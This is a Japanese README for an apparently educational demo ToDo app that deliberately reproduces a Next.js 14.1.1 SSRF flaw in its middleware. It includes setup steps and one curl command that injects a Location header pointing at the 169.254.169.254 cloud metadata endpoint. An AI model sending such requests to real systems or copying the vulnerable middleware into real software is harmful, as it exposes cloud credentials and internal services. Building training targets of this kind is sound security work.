# Next.js 14.1.1 SSRF Vulnerability Demo (CVE-2025-57822)

ToDoリスト管理アプリケーションを使用して、Next.js 14.1.1のSSRF脆弱性を再現するためのデモプロジェクト。

## 概要

このプロジェクトは、BetterAuthを使用した認証機能を持つToDoアプリケーションで、Next.js 14.1.1のSSRF脆弱性（CVE-2025-57822）を実装しています。

**⚠️ 警告**: このプロジェクトは教育目的で意図的に脆弱性を含んでいます。本番環境では使用しないでください。

## 機能

- TOPページから直接ログイン/登録
- ToDoの作成、編集、削除
- BetterAuthによる認証
- Prisma + SQLite
- **脆弱なMiddleware**: CVE-2025-57822の再現

## 開発環境のセットアップ

### Dev Container（推奨）

1. VS Codeで`Dev Containers`拡張機能をインストール
2. このフォルダを開く
3. `F1` → "Dev Containers: Reopen in Container"を選択
4. 自動的に環境が構築され、開発サーバーが起動します

### ローカル開発

必要なもの:
- Node.js 20+
- Bun

```bash
# 依存関係のインストール
bun install

# Prismaクライアントの生成とマイグレーション
bunx prisma generate
bunx prisma migrate dev --name init

# 開発サーバーの起動
bun run dev
```

### Docker（本番ビルド）

```bash
# ビルドと起動
docker compose up -d

# 停止
docker compose down
```

## 脆弱性の検証

詳細な検証手順は[walkthrough.md](/.gemini/antigravity/brain/fb79dc41-65d5-42f5-a4d5-96a334da497c/walkthrough.md)を参照してください。

### 基本的な検証

1. http://localhost:3000 にアクセスしてアカウントを作成
2. セッションCookieを取得
3. 以下のコマンドでSSRFを試行:

```bash
curl -H "Location: http://169.254.169.254/latest/meta-data/" \
     -H "Cookie: better-auth.session_token=<your-token>" \
     http://localhost:3000/
```

## プロジェクト構成

- `/app` - Next.js App Router
- `/lib` - BetterAuth設定
- `/prisma` - データベーススキーマ
- `middleware.ts` - **脆弱なMiddleware実装**
- `.devcontainer` - Dev Container設定

## ライセンス

このプロジェクトは教育目的のみです。
